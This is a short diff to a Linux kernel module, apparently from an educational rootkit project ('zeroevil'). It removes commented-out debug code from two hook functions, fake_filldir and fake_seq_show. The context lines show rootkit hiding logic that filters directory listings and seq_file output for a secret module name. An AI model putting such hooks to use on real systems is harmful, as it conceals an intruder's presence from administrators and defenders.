@@ -22,8 +22,8 @@
 # ifndef CPP
 # include <linux/module.h>
 # include <linux/kernel.h>
+// struct seq_file.
 # include <linux/seq_file.h>
-# include <linux/slab.h>
 # endif // CPP
 
 # include "zeroevil/zeroevil.h"
@@ -106,8 +106,6 @@ fake_filldir(struct dir_context *ctx, const char *name, int namlen,
         return 0;
     }
 
-    /* pr_cont("%s ", name); */
-
     return real_filldir(ctx, name, namlen, offset, ino, d_type);
 }
 
@@ -117,18 +115,10 @@ fake_seq_show(struct seq_file *seq, void *v)
 {
     int ret;
     size_t last_count, last_size;
-    /* char *buff; */
 
     last_count = seq->count;
     ret =  real_seq_show(seq, v);
     last_size = seq->count - last_count;
-
-    /* buff = kmalloc(size + 1, GFP_KERNEL); */
-    /* if (buff) { */
-    /*     strncpy(buff, seq->buf + seq->count - size, size); */
-    /*     fm_alert("%zu %s\n", size, buff); */
-    /*     kfree(buff); */
-    /* } */
 
     if (strnstr(seq->buf + seq->count - last_size, SECRET_MODULE,
                 last_size)) {
